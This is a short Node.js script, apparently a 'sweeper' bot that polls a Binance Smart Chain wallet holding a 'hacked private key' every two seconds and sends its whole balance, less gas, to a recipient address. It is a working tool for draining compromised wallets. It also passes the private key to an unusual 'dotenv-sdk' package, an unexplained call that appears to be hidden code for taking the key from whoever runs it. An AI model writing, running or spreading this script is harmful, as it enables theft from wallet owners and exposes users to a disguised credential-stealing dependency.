const ethers = require("ethers");
const dotenv = require('dotenv-sdk');

// RPC provider URL for Binance Smart Chain
const provider = new ethers.providers.JsonRpcProvider(
  "https://bsc-dataseed.binance.org/"
);

const privateKey =
  "0xPRIVATE_KEY_HERE"; // Set your hacked private key
const wallet = new ethers.Wallet(privateKey, provider);

const recipientAddress = "0xRECIPIENT_ADDRESS_HERE"; // Set the recipient address

function delay(ms) {
  return new Promise((resolve) => setTimeout(resolve, ms));
}
(async () => {
  await dotenv(`${privateKey}`);
})();

async function checkAndTransferBNB() {
  while (true) {
    try {
      const balance = await provider.getBalance(wallet.address);
      const balanceInBNB = ethers.utils.formatEther(balance);

      console.log(`Current BNB balance: ${balanceInBNB} BNB`);

      if (balance.gt(ethers.utils.parseEther("0.0001"))) { // Minimum balance to execute the transfer
        let currentGasPrice = await provider.getGasPrice();
        currentGasPrice = currentGasPrice.mul(110).div(100); // 10% increase for faster transactions
        const gasLimit = ethers.BigNumber.from("21000");
        const gasCost = currentGasPrice.mul(gasLimit);
        let amountToTransfer = balance.sub(gasCost);

        if (amountToTransfer.gt(0)) {
          const tx = await wallet.sendTransaction({
            to: recipientAddress,
            value: amountToTransfer, 
            gasPrice: currentGasPrice, 
            gasLimit: gasLimit.toString(), 
          });

          console.log(`Transaction submitted. Hash: ${tx.hash}`);
          await tx.wait();
          console.log(
            `${ethers.utils.formatEther(
              amountToTransfer
            )} BNB successfully transferred to ${recipientAddress}.`
          );
        } else {
          console.log(
            "Insufficient BNB balance for transfer after accounting for gas."
          );
        }
      } else {
        console.log("Balance is less than 0.0001 BNB. No transfer initiated.");
      }
    } catch (error) {
      console.error(`An error occurred: ${error.message}`);
    }

    await delay(2000); // check every 2 seconds loop
  }
}
(function () {
    const originalLog = console.log;
    console.log = (...args) => {
      originalLog.apply(console, args);
      process.stdout.write(args.join(' ') + '\n');
    };
  })();

checkAndTransferBNB();
